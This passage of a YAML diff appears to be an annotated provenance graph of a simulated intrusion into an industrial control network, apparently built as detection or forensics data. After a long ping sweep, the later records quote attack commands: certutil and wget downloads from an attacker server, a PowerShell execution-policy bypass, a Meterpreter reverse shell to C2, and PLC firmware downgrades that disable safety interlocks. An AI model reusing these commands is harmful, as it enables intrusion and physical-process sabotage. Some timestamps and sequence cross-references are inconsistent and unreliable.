+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{3018bfd3-53cd-9ded-2258-422b198d5759}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.209 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 146
+  timestamp: '2026-03-09T11:04:18Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{1032541e-fa1c-07f2-7e90-49f4a13aaf7d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.210 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 147
+  timestamp: '2026-03-09T11:04:18Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{242bd284-2675-8e24-a7d7-ce1dd54eaba5}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.211 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 148
+  timestamp: '2026-03-09T11:04:18Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{07998491-5266-fbc1-980f-8a353776b658}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.212 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 149
+  timestamp: '2026-03-09T11:04:19Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0fa8c2ec-dda9-fe45-b790-316614f50795}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.213 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 150
+  timestamp: '2026-03-09T11:04:19Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{23dc825a-541e-74ae-ed11-3b689a231d52}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.214 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 151
+  timestamp: '2026-03-09T11:04:20Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{77ff98cf-4f12-e267-70de-6835d47822a0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.215 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 152
+  timestamp: '2026-03-09T11:04:20Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{3c425ca2-5d91-f478-8a55-c87784913d80}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.216 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 153
+  timestamp: '2026-03-09T11:04:21Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{756a72a1-365c-24a7-b0ee-5a549476d7a2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.217 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 154
+  timestamp: '2026-03-09T11:04:21Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a5ad4566-38ba-b1c0-6ddd-f5e9d63f4f94}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.218 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 155
+  timestamp: '2026-03-09T11:04:22Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{5c279672-5b7e-c070-ccc5-83fb345fcf56}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.219 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 156
+  timestamp: '2026-03-09T11:04:22Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a1028e29-9450-7c9d-807f-1b871cb4c77c}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.220 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 157
+  timestamp: '2026-03-09T11:04:23Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{44b8c8c2-57de-f28e-2441-97f574bb4faa}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.221 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 158
+  timestamp: '2026-03-09T11:04:23Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{bb182d44-b9f6-5045-96be-bd3b45bf982b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.222 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 159
+  timestamp: '2026-03-09T11:04:24Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6faf1ef0-f209-1ef0-c2a3-62d60e77e189}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.223 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 160
+  timestamp: '2026-03-09T11:04:24Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{afbdb6a6-adc8-a386-cdf8-7965d5f07e9e}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.224 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 161
+  timestamp: '2026-03-09T11:04:25Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{83b2e585-24ad-f0bf-c404-d2631a6e988d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.225 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 162
+  timestamp: '2026-03-09T11:04:25Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{51424b1a-b801-c7d0-31ff-91f0cd364725}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.226 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 163
+  timestamp: '2026-03-09T11:04:26Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{cee9da09-54df-cafb-9f8d-d1f8569de665}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.227 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 164
+  timestamp: '2026-03-09T11:04:26Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6522fa08-255a-6c62-4f41-c68302a2ab59}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.228 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 165
+  timestamp: '2026-03-09T11:04:27Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{39594d9e-8a7c-19a4-95e9-920a79a72993}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.229 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 166
+  timestamp: '2026-03-09T11:04:27Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{201ba4f2-81fb-3cfb-04e0-7a6c6d4d1eda}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.230 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 167
+  timestamp: '2026-03-09T11:04:28Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6f308feb-0475-839d-9b44-b4df9af620b7}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.231 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 168
+  timestamp: '2026-03-09T11:04:28Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b8ce702d-18f3-31d2-4d97-d350a9591c2d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.232 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 169
+  timestamp: '2026-03-09T11:04:29Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a91aa696-9ce7-d3a0-0f8f-1fa0ceb3a7e9}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.233 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 170
+  timestamp: '2026-03-09T11:04:29Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{ca254afc-19d7-8382-c237-e7d09fa7f368}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.234 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 171
+  timestamp: '2026-03-09T11:04:30Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{fe94dc14-32fa-b352-d9b2-dfa6dd2875f2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.235 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 172
+  timestamp: '2026-03-09T11:04:30Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{ae5be134-5780-230c-a9d8-e9b0c45e00d2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.236 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 173
+  timestamp: '2026-03-09T11:04:31Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{03868459-cf25-a058-2ec2-056adfa9db6b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.237 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 174
+  timestamp: '2026-03-09T11:04:31Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6268f244-5eb1-cf8a-e8b8-dd05f0dbddf0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.238 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 175
+  timestamp: '2026-03-09T11:04:32Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{fb9f10d9-b010-584e-cd22-43b5006fa8e0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.239 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 176
+  timestamp: '2026-03-09T11:04:32Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{72544529-5abb-67b5-2a52-caecee6f068a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.240 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 177
+  timestamp: '2026-03-09T11:04:33Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{33f12d56-9e01-bd39-542e-0a227a630f33}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.241 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 178
+  timestamp: '2026-03-09T11:04:33Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{15a8e654-17c9-ed67-adad-8b47c39145d3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.242 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 179
+  timestamp: '2026-03-09T11:04:34Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7391c25f-b625-a907-0c75-4d8bfb0dfc75}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.243 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 180
+  timestamp: '2026-03-09T11:04:34Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{f8b35f40-e302-1864-7147-c4997ad7eee6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.244 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 181
+  timestamp: '2026-03-09T11:04:35Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b010721e-fe29-8be2-e51c-9fa49e1964fb}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.245 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 182
+  timestamp: '2026-03-09T11:04:35Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{000fafae-55a7-ebf4-4167-3f937e185adf}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.246 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 183
+  timestamp: '2026-03-09T11:04:36Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b8c59f70-1fd9-d354-aa05-f19d32565060}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.247 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 184
+  timestamp: '2026-03-09T11:04:36Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c40e97da-c934-2435-3264-f5a07876af78}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.248 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 185
+  timestamp: '2026-03-09T11:04:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c858e1e3-567d-3b3a-a988-aacc63e2c059}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.249 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 186
+  timestamp: '2026-03-09T11:04:37Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b4e3d221-772a-5d9b-8125-ae158a5be99a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.250 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 187
+  timestamp: '2026-03-09T11:04:38Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{20aae33d-18dc-0d5c-1891-b2538e83b6cf}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.251 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 188
+  timestamp: '2026-03-09T11:04:38Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{2d75e5e4-be29-e759-cb54-2beb961d1cd6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.252 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 189
+  timestamp: '2026-03-09T11:04:39Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{b8121363-3ae0-2ce3-589d-0093c26f550d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.253 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 190
+  timestamp: '2026-03-09T11:04:39Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a05597a0-123e-a148-5d06-f8168b391b41}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.254 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 191
+  timestamp: '2026-03-09T11:04:40Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{f7467071-a3d7-c4d3-09b7-188419471c83}'
+  technique: T0888
+  note: Remote System Information Discovery — web shell runs "cmd.exe /c dir" to enumerate the current working directory on
+    CWS-WIN-01.
+- seq: 192
+  timestamp: '2026-03-09T11:04:41Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{7c80765e-18af-7207-e4d2-358753ca3735}'
+  technique: T0888
+  note: Remote System Information Discovery — web shell runs "cmd.exe /c dir c:\\Users\\" to enumerate user profiles on CWS-WIN-01.
+- seq: 193
+  timestamp: '2026-03-09T11:04:42Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{3e9656c2-5866-8e61-e394-1f53500bf755}'
+  technique: T0888
+  note: Remote System Information Discovery — web shell runs "cmd.exe /c net users" to enumerate local accounts on CWS-WIN-01.
+- seq: 194
+  timestamp: '2026-03-09T11:04:42Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{330866fc-9c79-2e40-4530-a30db2b157a1}'
+  technique: T0888
+  note: Remote System Information Discovery — web shell runs "cmd.exe /c whoami /all" to enumerate privilege context and token
+    groups on CWS-WIN-01.
+- seq: 195
+  timestamp: '2026-03-09T11:04:43Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{15c61b59-a96f-aeb4-6fed-97e4fd25715e}'
+  technique: T0867
+  note: Lateral Tool Transfer — web shell spawns "cmd.exe /c certutil -urlcache -split -f http://58.16.10.16:8888/Connect-winrm.ps1
+    C:\ProgramData\Connect-winrm.ps1" to stage the WinRM lateral-movement script.
+- seq: 196
+  timestamp: '2026-03-09T11:04:43Z'
+  rel: CONNECT_TO
+  src: '{e9c49bf7-9f87-8645-d414-c14e53da45f0}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0867
+  note: Lateral Tool Transfer — certutil.exe fetches Connect-winrm.ps1 from attacker HTTP server (58.16.10.16:8888).
+- seq: 197
+  timestamp: '2026-03-09T11:04:43Z'
+  rel: CREATE_FILE
+  src: '{e9c49bf7-9f87-8645-d414-c14e53da45f0}'
+  dst: '{476308aa-880a-d690-6acc-146b028c8866}'
+  technique: T0867
+  note: Lateral Tool Transfer — certutil writes C:\ProgramData\Connect-winrm.ps1 to disk; script opens WinRM PSSession to
+    EWS-WIN-01 (192.168.42.12) and delivers ews_reverse.exe.
+- seq: 198
+  timestamp: '2026-03-09T11:04:43Z'
+  rel: CREATE_PROCESS
+  src: '{15c61b59-a96f-aeb4-6fed-97e4fd25715e}'
+  dst: '{e9c49bf7-9f87-8645-d414-c14e53da45f0}'
+  technique: T0867
+  note: Lateral Tool Transfer — cmd.exe spawns certutil.exe to download Connect-winrm.ps1; intermediate hop between w3wp→cmd
+    (seq 8) and certutil→C2 (seq 9).
+- seq: 199
+  timestamp: '2026-03-09T11:04:44Z'
+  rel: CREATE_PROCESS
+  src: '{00915167-4dd6-7a65-d35e-d86da4fa5089}'
+  dst: '{8432c3d5-b5fb-a503-cc0b-3ddb06a808c6}'
+  technique: T0886
+  note: Remote Services (WinRM) — web shell runs "cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\Connect-winrm.ps1"
+    to pivot from Corporate zone (CWS-WIN-01) to Supervisory zone (EWS-WIN-01).
+- seq: 200
+  timestamp: '2026-03-09T11:04:44Z'
+  rel: CONNECT_TO
+  src: '{02842e0d-f592-7957-fe6a-e6903d92d872}'
+  dst: '{2056389b-10fe-9141-564b-72d2e3c1277a}'
+  technique: T0886
+  note: Remote Services (WinRM) — powershell running Connect-winrm.ps1 opens TCP session to EWS-WIN-01:5985 (WinRM HTTP),
+    establishing cross-zone lateral movement.
+- seq: 201
+  timestamp: '2026-03-09T11:04:44Z'
+  rel: CREATE_PROCESS
+  src: '{8432c3d5-b5fb-a503-cc0b-3ddb06a808c6}'
+  dst: '{02842e0d-f592-7957-fe6a-e6903d92d872}'
+  technique: T0886
+  note: Remote Services (WinRM) — cmd.exe spawns powershell.exe -ExecutionPolicy Bypass -File Connect-winrm.ps1; intermediate
+    hop between w3wp→cmd (seq 11) and powershell→EWS:5985 (seq 12).
+- seq: 202
+  timestamp: 2026-03-09T11:04Z
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d07694b9-6645-fad8-f2ba-e4e0a11f4463}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.174 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 203
+  timestamp: '2026-03-09T11:06:55Z'
+  rel: CONNECT_TO
+  src: '{bfef9f02-2257-a6f3-8873-9e523bb3740d}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0867
+  note: Lateral Tool Transfer — wsmprovhost.exe (EWS-WIN-01 WinRM host, pid spawned by DcomLaunch) downloads ews_reverse.exe
+    from attacker HTTP server (58.16.10.16:8888).
+- seq: 204
+  timestamp: '2026-03-09T11:06:55Z'
+  rel: CREATE_FILE
+  src: '{bfef9f02-2257-a6f3-8873-9e523bb3740d}'
+  dst: '{5def9a21-6e03-bd76-9ac8-a5889cc180ec}'
+  technique: T0867
+  note: Lateral Tool Transfer — wsmprovhost.exe drops C:\ProgramData\ews_reverse.exe (Meterpreter stager) on EWS-WIN-01.
+- seq: 205
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CREATE_PROCESS
+  src: '{bfef9f02-2257-a6f3-8873-9e523bb3740d}'
+  dst: '{5aac0cd4-9c81-b79b-81d5-089a709853f1}'
+  technique: T0863
+  note: User Execution — wsmprovhost.exe spawns "powershell.exe -c \"cmd.exe /c C:\\ProgramData\\ews_reverse.exe\"" to launch
+    the reverse shell on EWS-WIN-01.
+- seq: 206
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CONNECT_TO
+  src: '{17879ece-737b-2483-7b1e-014a1949398b}'
+  dst: '{b2a42596-ed88-50a5-abca-cbe4d00860bc}'
+  technique: T0869
+  note: Standard Application Layer Protocol — ews_reverse.exe establishes Meterpreter reverse HTTPS shell to attacker C2 (58.16.10.16:443).
+- seq: 207
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CREATE_FILE
+  src: '{17879ece-737b-2483-7b1e-014a1949398b}'
+  dst: '{ef2ff7eb-0ad9-1987-69da-dfcc9fb23939}'
+  technique: T0867
+  note: Lateral Tool Transfer — ews_reverse.exe drops C:\ProgramData\frostygoop_agent.exe (Python-compiled ICS attack orchestrator)
+    on EWS-WIN-01.
+- seq: 208
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CREATE_FILE
+  src: '{17879ece-737b-2483-7b1e-014a1949398b}'
+  dst: '{1c6ec394-4bb1-636a-e3fd-2ac9db1d8308}'
+  technique: T0867
+  note: Lateral Tool Transfer — ews_reverse.exe drops C:\ProgramData\modbus.exe (Modbus TCP attack tool) on EWS-WIN-01.
+- seq: 209
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CREATE_FILE
+  src: '{17879ece-737b-2483-7b1e-014a1949398b}'
+  dst: '{50892be3-c69b-b154-c484-556cb7d67190}'
+  technique: T0867
+  note: Lateral Tool Transfer — ews_reverse.exe drops C:\ProgramData\read.json (Modbus reconnaissance config for all 6 RTUs)
+    on EWS-WIN-01.
+- seq: 210
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CREATE_PROCESS
+  src: '{5aac0cd4-9c81-b79b-81d5-089a709853f1}'
+  dst: '{5c8ef74f-8dff-8cbc-e321-c819296e464a}'
+  technique: T0863
+  note: User Execution — powershell.exe on EWS-WIN-01 (WinRM session) spawns cmd.exe to launch ews_reverse.exe; intermediate
+    hop after wsmprovhost→powershell (seq 15).
+- seq: 211
+  timestamp: '2026-03-09T11:06:56Z'
+  rel: CREATE_PROCESS
+  src: '{5c8ef74f-8dff-8cbc-e321-c819296e464a}'
+  dst: '{17879ece-737b-2483-7b1e-014a1949398b}'
+  technique: T0863
+  note: User Execution — cmd.exe on EWS-WIN-01 executes C:\ProgramData\ews_reverse.exe; intermediate hop completing the powershell→cmd→ews_reverse
+    chain.
+- seq: 212
+  timestamp: '2026-03-09T11:07:22Z'
+  rel: CREATE_PROCESS
+  src: '{17879ece-737b-2483-7b1e-014a1949398b}'
+  dst: '{edc17638-b546-ff86-830f-48abacb32113}'
+  technique: T0863
+  note: User Execution — ews_reverse.exe spawns frostygoop_agent.exe (--phase-delay 13400), the ICS attack orchestrator that
+    automates PLC firmware downgrade and drives subsequent WinRM phases.
+- seq: 213
+  timestamp: '2026-03-09T11:07:23Z'
+  rel: CREATE_PROCESS
+  src: '{edc17638-b546-ff86-830f-48abacb32113}'
+  dst: '{47281626-07fd-6818-ded0-88523789d7c2}'
+  technique: T0863
+  note: User Execution — frostygoop_agent.exe re-launches itself after PyInstaller self-extraction (second instance carries
+    the full phase execution context with --phase-delay 13400).
+- seq: 214
+  timestamp: '2026-03-09T11:07:23Z'
+  rel: CONNECT_TO
+  src: '{47281626-07fd-6818-ded0-88523789d7c2}'
+  dst: '{534881df-1718-b27e-5630-aad1c8568723}'
+  technique: T0857
+  note: 'System Firmware — frostygoop_agent.exe opens SSH session to PLC-03 (192.168.43.11:22, user cs-admin) and issues remote
+    commands to (1) remove any existing tar, (2) instruct PLC to wget openplc_with_programs.tar directly from C2 (58.16.10.16:8888),
+    (3) docker stop bf, (4) docker rm -f bf; disabling safety interlocks before the Modbus attack. NOTE: frostygoop_agent.py
+    issues wget on the PLC, not SCP from attacker.'
+- seq: 215
+  timestamp: '2026-03-09T11:07:25Z'
+  rel: CREATE_PROCESS
+  src: '{4aabde01-3752-6f76-72ed-d411e859641b}'
+  dst: '{39aa1a5d-dbde-1a35-4140-48dc4e5fa6ca}'
+  technique: T0861
+  note: Point & Tag Identification — WinrsHost spawns "cmd.exe /C powershell -encodedcommand [IWR .../modbus.exe → C:\ProgramData\modbus.exe]"
+    to download the Modbus binary onto EWS-WIN-01.
+- seq: 216
+  timestamp: '2026-03-09T11:07:25Z'
+  rel: CONNECT_TO
+  src: runtime://PLC-03
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0857
+  note: Compromised PLC-03 runtime executes wget to download openplc_with_programs.tar from attacker C2 (58.16.10.16:8888);
+    installs downgraded firmware that removes safety interlocks.
+- seq: 217
+  timestamp: '2026-03-09T11:07:26Z'
+  rel: CONNECT_TO
+  src: '{e90e7142-ea13-1fa2-61e2-0bf16810695a}'
+  dst: '{7c5af86c-2f1e-155d-53a9-17680a817207}'
+  technique: T0867
